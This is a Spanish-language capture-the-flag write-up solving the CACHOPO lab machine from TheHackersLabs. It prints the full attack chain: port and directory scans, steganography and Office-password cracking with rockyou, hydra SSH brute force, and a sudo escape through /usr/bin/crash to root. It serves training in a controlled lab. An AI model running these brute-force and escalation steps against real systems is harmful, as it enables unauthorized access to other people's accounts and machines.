# <p align="center">Laboratorio de Ciberseguridad: Resolución de la Máquina CACHOPO</p>

<p align="center">
  <img src="Imagenes/Cachopo.png" width="400" height="300">
</p>

<p align="center">🖥️ **Plataforma: TheHackersLabs** 🖥️</p>

---

<p align="center">
  <img src="Imagenes/GRUPO URTG.png" width="600" height="500">
</p>

---

## <p align="center">Objetivo del Laboratorio</p>

El propósito de este ejercicio es simular un entorno de intrusión controlada mediante técnicas ofensivas: reconocimiento activo, enumeración de servicios, análisis de archivos y escalada de privilegios. Trabajaremos con la máquina **CACHOPO**, la cual representa un entorno vulnerable realista dentro de una red aislada.

---

## 🚀 Inicio del Entorno y Reconocimiento de Red

1. 🔌 **Ejecución de la máquina CACHOPO**  
   - IP asignada: `172.20.10.2`
  
     <img width="286" height="118" alt="image" src="https://github.com/user-attachments/assets/375f142f-2877-4000-8a95-29d98f71ecab" />


2. ✅ **Validación de conectividad entre máquinas**
   ```bash
   ping 172.20.10.2
   ```
   <img width="289" height="93" alt="image" src="https://github.com/user-attachments/assets/89ddba92-30be-4a43-b26b-003d7d2f8433" />

   <img width="411" height="45" alt="image" src="https://github.com/user-attachments/assets/e56637a2-ba45-4699-bf46-3bd69fd0c29b" />

3. 🔎 **Escaneo de puertos expuestos**
   ```bash
   sudo nmap 172.20.10.2
   ```
   <img width="319" height="109" alt="image" src="https://github.com/user-attachments/assets/fb23146a-a650-4e2b-8456-199d85c65ad9" />

   > Se detectan puertos abiertos: `22 (SSH)` y `80 (HTTP)`

---

## 🌐 Enumeración del Servicio Web

1. 🔍 **Acceso al sitio desde el navegador**

    <img width="442" height="342" alt="image" src="https://github.com/user-attachments/assets/08ce8188-16a8-4c48-aa0e-0cfef16c182c" />

2. 🗂️ **Exploración de directorios ocultos con Gobuster**
   ```bash
   gobuster dir -u http://172.20.10.2 -w /usr/share/wordlists/dirbuster/...
   ```

   <img width="442" height="224" alt="image" src="https://github.com/user-attachments/assets/02f75658-fac2-4c54-aef9-12443746e5be" />

   > Primer escaneo devuelve códigos 301 (redirección), por lo que se ajusta el comando.
   
   El servidor redirige automáticamente cuando no encuentra una URL, pero en lugar de dar un 404, devuelve un 301 (Moved Permanently).
   Por eso gobuster lo interpreta como si todos los intentos fueran válidos, lo cual rompe la enumeración.

4. 🔐 **Segunda ejecución detecta códigos 403 (acceso denegado)**:

   Se corre de nuevo el comando así:
   
   <img width="442" height="408" alt="image" src="https://github.com/user-attachments/assets/6fed5c61-ebe3-4f8e-b216-a9f3e9ea769a" />

   Los códigos de estado 403 Forbidden indican que la ruta existe, pero tu cliente no tiene permiso para acceder directamente. Esto es una
   señal valiosa: hay contenido protegido que podría explotarse por otros medios.

   En tu gobuster aparecieron rutas como:

   - `/.htaccess`, `/.htpasswd`, `/server-status`
   - Archivos con `.html`, `.txt`, `.php`

   Pero todos con 403 ⇒ eso significa que están allí, pero no son accesibles de forma directa desde el navegador o curl.

4. 🛡️ **Escaneo con Nikto revela dominio virtual:**

   Herramienta para detectar configuraciones erróneas o archivos escondidos

   <img width="442" height="283" alt="image" src="https://github.com/user-attachments/assets/2ffc43a9-f7ba-4e3f-8f79-bd22cb3e6341" />

   **Hallazgo importante:**

   plaintext

   CopiarEditar

   Root page / redirects to: http://cachopo.thl/
   
   Esto significa que el sitio redirige automáticamente a un dominio virtual llamado:

   ```
   http://cachopo.thl
   ```

6. 🛠️ **Solución: añadir dominio al archivo de hosts**
   ```bash
   echo "172.20.10.2 cachopo.thl" >> /etc/hosts
   ```
   Se abre en el navegador la dirección http://cachopo.thl y esto permite ver el sitio real:

   <img width="442" height="368" alt="image" src="https://github.com/user-attachments/assets/2911bb27-622e-4b85-b50a-3c175f35254c" />

---

## 🖼️ Análisis de Imagen y Esteganografía

1. 📥 **Descarga de imagen desde el sitio**

      Se abre la imagen en una nueva ventana y se procede a descargarla como: cachopo.jpg.

      <img width="442" height="246" alt="image" src="https://github.com/user-attachments/assets/fbfd31da-dae2-4b43-ad44-7e0b96bcacfe" />

      Ingreso a la carpeta Downloads, ejecuto ls para confirmar que el archivo está ahí y posteriormente verifico con file el tipo de
      archivo, verificando que sea una imagen.

      <img width="442" height="114" alt="image" src="https://github.com/user-attachments/assets/3f75dc22-1dfb-4f5f-b354-e96e5cea2b28" />

2. 🔍 **Verificación de metadatos**

      <img width="313" height="259" alt="image" src="https://github.com/user-attachments/assets/66d7a4bd-d5f2-447f-9183-db964e519650" />


   ```bash
   exiftool cachopo.jpg
   ```

      No se observan comentarios, autores, descripciones ni pistas visibles en los metadatos de la imagen. Esto es común cuando la información 
      está oculta por esteganografía más elaborada.


3. 🔐 **Intento de extracción con steghide**

      Se descarga la imagen:

   <img width="560" height="163" alt="image" src="https://github.com/user-attachments/assets/98f9b127-b7a0-43ef-ace1-a444644c30f7" />

      Se verifica con steghide:

   <img width="372" height="81" alt="image" src="https://github.com/user-attachments/assets/5cadc080-28e1-4a9a-817c-4e04f99371eb" />


   ```bash
   steghide extract -sf cachopo.jpg
   ```

      Se emplea steghide pero pide passphrase.
   
      Teniendo en cuenta que no se puede con steghide, se instala **stegcracker** para hacerlo por otro medio.

5. 🔓 **Ataque por diccionario con stegcracker**

      <img width="442" height="233" alt="image" src="https://github.com/user-attachments/assets/1dbc468f-6d9e-469a-a43e-69ef67aef682" />

   ```bash
   stegcracker cachopo.jpg /usr/share/wordlists/rockyou.txt
   ```

   Como resultado al correr el comando se obtiene que:
   
   <img width="391" height="184" alt="image" src="https://github.com/user-attachments/assets/033367b9-b74b-44cb-8e75-2aab2f8ab2ab" />

   > Contraseña encontrada: `doggies`

7. 📂 **Extracción del archivo oculto**

    Se emplea de nuevo steghide y se utiliza la passphrase encontrada:

   <img width="235" height="61" alt="image" src="https://github.com/user-attachments/assets/04ce0440-7bcf-4ed1-ae61-1cdb97191de5" />

   ```bash
   steghide extract -sf cachopo.jpg -p doggies
   ```

    Se lee el contenido del archivo.

    <img width="199" height="45" alt="image" src="https://github.com/user-attachments/assets/f65f1c73-b097-4ee9-88e4-bb1d4d2f5c3a" />

---

## 📁 Descubrimiento de Archivo Protegido

1. 🌐 **Acceso a `/mycachopo` → archivo `cocineros.txt`**

     Siguiente paso es entrar al directorio oculto en el servidor web, ubicado en:

     `http://cachopo.thl/mycachopo`

     Se abre en el navegador y se obtiene que: 

     <img width="442" height="158" alt="image" src="https://github.com/user-attachments/assets/ede4316d-e005-4e9b-8311-2a5656adcd2d" />

     Se obtiene que hay un **listado de directorio habilitado** (Index of /mycachopo), el cual contiene un archivo llamado cocineros.

     Se da clic en cocineros y se descarga la imagen

     <img width="442" height="149" alt="image" src="https://github.com/user-attachments/assets/4deefd50-c41c-4f80-ad5c-cab3c8178ebb" />

     Se descarga el archivo por medio del uso de la terminal para guardarlo directamente:

     <img width="442" height="128" alt="image" src="https://github.com/user-attachments/assets/5a842ba2-b8d0-4a18-977c-93e390e20c5b" />

2. 🔍 **Análisis del archivo**

     Se revisa el contenido con el comando:

     ```bash
     cat cocineros.txt
     ```
     
     Y aparece esto:

     <img width="442" height="283" alt="image" src="https://github.com/user-attachments/assets/542acaba-9fa8-46c8-9fc4-780c09fe229e" />

     Se verifica el tipo real del archivo

   ```bash
   file cocineros.txt
   ```

    <img width="191" height="49" alt="image" src="https://github.com/user-attachments/assets/23f7b1cc-5987-4922-bdbd-a95d88ae0b6c" />

   > Resultado: Formato cifrado CDFV2

    Esto significa que:
   
    cocineros.txt es en realidad un archivo ofimático antiguo en formato OLE (Composite Document File V2), **¡y está cifrado!**
    Es común en archivos .doc (Word 97-2003), .xls, .ppt y puede requerir una contraseña para abrirse.

3. 📝 **Renombrar para apertura como documento**

   Se renombra el archivo para que tenga una extensión .doc

   ```bash
   mv cocineros.txt cocineros.doc
   ```

   <img width="200" height="31" alt="image" src="https://github.com/user-attachments/assets/0ce031bf-4382-4ea5-a6c2-ccd61e165b3a" />

   Para abrir el archivo cocineros.txt, primero se utiliza el siguiente comando:

   ```bash
   cat cocineros.txt
   ```
   
   Posteriormente se abre con libreoffice y sale el siguiente letrero solicitándo contraseña:

   <img width="493" height="171" alt="image" src="https://github.com/user-attachments/assets/541e18bc-b748-4da7-a2f0-7bd50079b65c" />

5. 🔐 **Ataque de contraseña con John the Ripper**

   Se usa:

   ```bash
   python3 /usr/share/john/office2john.py cocineros.doc > hash.txt
   john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
   ```

   para romper la contraseña y obtengo lo siguiente:

   <img width="449" height="220" alt="image" src="https://github.com/user-attachments/assets/2f1b29f3-ef6a-41ee-9521-1978aadd2a50" />

   > Contraseña: `horse1`

7. 🧑‍💻 **Contenido recuperado**: usuarios posibles → `Sofia`, `Carlos`, `Luis`

---

## 🛠️ Ataque por Fuerza Bruta (SSH)

1. 🧾 **Crear archivo de usuarios**
   ```bash
   echo -e "Sofia\nCarlos\nLuis" > user.txt
   ```

2. 🔓 **Ejecutar hydra**
   ```bash
   hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ssh://172.20.10.2
   ```
   > Acceso válido: `carlos : [contraseña descubierta]`

3. 🖥️ **Ingreso al sistema**
   ```bash
   ssh carlos@172.20.10.2
   ```

---

## 🔝 Escalada de Privilegios

1. 🔍 **Verificación de permisos sudo**
   ```bash
   sudo -l
   ```
   > El usuario puede ejecutar `/usr/bin/crash` como root sin contraseña

2. 🚨 **Explotación del binario crash**
   ```bash
   sudo /usr/bin/crash
   !sh
   ```

3. ✅ **Confirmación de acceso root**
   ```bash
   whoami
   # root
   ```

---

## 🧾 Conclusiones

- ✅ La máquina **CACHOPO** permitió aplicar múltiples técnicas de pentesting en un solo flujo.
- 🔧 Se demostró cómo un binario con permisos mal gestionados puede convertirse en un vector de escalada.
- 🧠 El ejercicio integró herramientas clave: `nmap`, `gobuster`, `nikto`, `steghide`, `john`, `hydra`, y `sudo`.

---

## 📚 Referencias

- https://curiosidadesdehackers.com/resolucion-de-la-maquina-cachopo/
- https://medium.com/@D4nYeD/plataforma-thehackerslabs-ctf-write-up-cachopo-f84b11198dd0
- `man nmap`, `man steghide`, `man john`, `man sudo
